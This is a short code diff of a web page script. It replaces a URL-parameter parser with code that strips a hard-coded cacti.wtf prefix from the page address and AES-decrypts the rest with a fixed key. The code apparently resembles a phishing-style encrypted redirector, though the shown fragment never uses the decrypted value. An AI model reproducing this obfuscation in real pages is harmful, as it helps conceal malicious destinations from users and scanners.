@@ -11,18 +11,11 @@
 
 <script>
     // Function to get the value of a URL parameter
-    function getParameterByName(name, url) {
-        if (!url) url = window.location.href;
-        name = name.replace(/[\[\]]/g, "\\$&");
-        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-            results = regex.exec(url);
-        if (!results) return null;
-        if (!results[2]) return '';
-        return results[2].replace(/\+/g, " ");
-    }
+    var cryi = window.location.href
+   var  url2 = cryi.replace("https://www.cacti.wtf/FN7Ev7VuYgI3IjdscZOuJz8rKAoNy/TWaVXWDu9rmSgCbuCL6dSuU5HZjXs?r=", "");
 
     // Get the value of the 'r' parameter
-    var parminiterValue = getParameterByName('r');
+    var parminiterValue = url2
   var decrypted = CryptoJS.AES.decrypt(parminiterValue, "cacti.wtf");
 //4d657373616765
 
